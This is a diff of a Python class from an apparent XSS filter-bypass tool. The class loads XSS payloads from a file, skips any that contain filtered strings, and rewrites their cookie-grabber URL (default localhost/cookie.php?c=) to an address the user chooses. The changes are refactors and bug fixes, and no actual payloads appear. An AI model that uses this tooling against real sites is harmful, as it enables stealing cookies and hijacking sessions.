@@ -3,9 +3,8 @@ import sys
 
 class PayloadCrafter:
     def __init__(self, grabberAddress="http://localhost/cookie.php?c="):
-        self.restricted = []
         self.payloads = []
-        
+        self.restricted = []
         self.oldAddress = "http://localhost/cookie.php?c="
         self.grabberAddress = grabberAddress
                 
@@ -22,6 +21,9 @@ class PayloadCrafter:
         with open('XSSFilterBypass/payloads.txt', 'r') as payloads:
             for payload in payloads:
                 self.payloads.append(payload.strip())
+      
+    def clear_restricted(self):
+        self.restricted = []
         
     def add_restricted(self, elements):
         if type(elements) is str:
@@ -38,10 +40,10 @@ class PayloadCrafter:
     def craft(self, payload):
         return payload.replace(self.oldAddress, self.grabberAddress)
     
-    def return_payloads(self):
+    def get_payloads(self):
         payloads = []
         for payload in self.payloads:
-            if not any(self.restricted) in payload:
-                payloads.append(craft(payload))
+            if not any([i in payload for i in self.restricted]):
+                payloads.append(self.craft(payload))
         self.payloads = payloads
         return self.payloads
